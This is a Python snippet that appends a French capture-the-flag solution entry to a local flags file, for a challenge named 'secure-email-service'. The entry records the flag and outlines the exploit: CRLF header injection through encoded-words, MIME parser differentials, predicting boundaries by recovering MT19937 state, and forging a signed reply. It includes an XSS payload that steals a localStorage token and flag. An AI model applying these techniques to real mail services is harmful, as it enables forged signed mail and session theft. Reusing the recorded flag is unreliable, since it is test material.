row = ("| 2026-11-27 | secure-email-service (496) | web/s-mime | "
       "`academy{always_a_step_ahead_fb2a1a8c}` | "
       "CRLF injecte via encoded-words (`=?utf-8?B?` par tranches de 30 o: `parser.wasm` rend le CRLF brut "
       "dans `parsed.subject`) recopie par `reply.html` dans le Subject de la reponse SIGNEE par l'admin, et "
       "par le template dans le corps signe. `parser.wasm` = mail-parser 0.9.4 : `header_value` fait "
       "`.rev().find()` -> le DERNIER en-tete gagne ; `openssl.wasm` resout les doublons ni premier ni dernier "
       "(mesure: il a pris le `text/html` du milieu -> `invalid mime type`) -> TOUS les Content-Type visibles "
       "doivent etre le vrai multipart/signed. Le generateur Python (3.12 comme 3.14) replie le Subject via "
       "`email.header.Header` et SUPPRIME les lignes vides + espaces de fin -> un `\\r\\n\\r\\n` en tete ne "
       "termine PAS le bloc d'en-tetes, tout le payload y reste. Payload final : ` Content-Type : text/html` "
       "(espace de tete = simple continuation pour OpenSSL, mais 1re ligne apres la boundary donc toujours lue "
       "par mail-parser ; la ligne CTE ne doit PAS avoir d'espace sinon elle devient continuation de la valeur "
       "du CT et le base64 n'est plus decode) + derniere ligne `Content-Type : multipart/signed; "
       "protocol=\"application/pkcs7-signature\"; micalg=\"sha-256\"; boundary=\"B2\"` avec B2 = boundary "
       "EXTERNE predite (MT19937 `getrandbits(63)`, untemper+z3 sur 700 envois ; un envoi signe consomme DEUX "
       "valeurs: multipart/mixed puis multipart/signed ; le bot repond 2 fois -> 2 valeurs par run) => les deux "
       "parseurs retombent sur le multipart/signed. Espace avant le `:` obligatoire (`\\nContent-Type:` -> "
       "HeaderParseError -> 500 sur /api/send). `smail` signe `as_string().replace(b'\\n', b'\\r\\n')` (payload "
       "en LF). Injection de partie dans le corps: `--B1 ` + CT/CTE base64 (padding `--B1 ` / `--B1-- ` pour "
       "que `_make_boundary` (regex `^--B(--)?$`) ne renomme pas). Exfil: `<img src=x onerror=fetch('/api/send',"
       "{headers:{token:localStorage.token},body:{to:'user@ses',subject:'pwned',body:localStorage.flag}})`. "
       "Valide sur une VRAIE reponse capturee (instance sacrifiee avec `From :user@ses`) avec `parser.wasm` + "
       "`openssl.wasm` + le vrai CA : html==payload, `CMS Verification successful`. |\n")

p = r'.\flags.md'
with open(p, 'ab') as f:
    f.write(row.encode('utf-8'))
print('appended', len(row), 'chars')
b = open(p, 'rb').read()
print('new size', len(b))
print(b[-260:].decode('utf-8'))
